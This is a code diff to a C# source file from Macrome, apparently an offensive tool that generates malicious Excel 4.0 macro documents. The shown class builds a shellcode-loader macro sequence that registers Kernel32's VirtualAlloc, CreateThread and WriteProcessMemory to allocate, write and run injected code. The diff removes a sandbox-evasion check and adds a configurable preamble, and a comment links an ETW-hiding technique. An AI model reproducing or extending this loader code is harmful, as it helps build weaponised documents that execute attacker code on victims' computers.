@@ -5,7 +5,7 @@ namespace Macrome
 {
     public static class MacroPatterns
     {
-        public static List<String> GetBinaryLoaderPattern(string macroSheetName)
+        public static List<String> GetBinaryLoaderPattern(List<string> preamble, string macroSheetName)
         {
             //TODO Autocalculate these values at generation time
             //These variables assume certain positions in generated macros
@@ -25,8 +25,6 @@ namespace Macrome
             //TODO [Functionality] Add support for .NET payloads (https://docs.microsoft.com/en-us/dotnet/core/tutorials/netcore-hosting, https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/)
             List<string> macros = new List<string>()
             {
-                "=IF(GET.WORKSPACE(13)<770, CLOSE(FALSE),)",
-                // "=HALT()",
                 "=REGISTER(\"Kernel32\",\"VirtualAlloc\",\"JJJJJ\",\"VA\",,1,0)",
                 "=REGISTER(\"Kernel32\",\"CreateThread\",\"JJJJJJJ\",\"CT\",,1,0)",
                 "=REGISTER(\"Kernel32\",\"WriteProcessMemory\",\"JJJCJJ\",\"WPM\",,1,0)",
@@ -45,7 +43,11 @@ namespace Macrome
                 "=WAIT(NOW()+\"00:00:03\")",
                 "=HALT()"
             };
-
+            if (preamble.Count > 0)
+            {
+                preamble.AddRange(macros);
+                return preamble;
+            }
             return macros;
         }
 
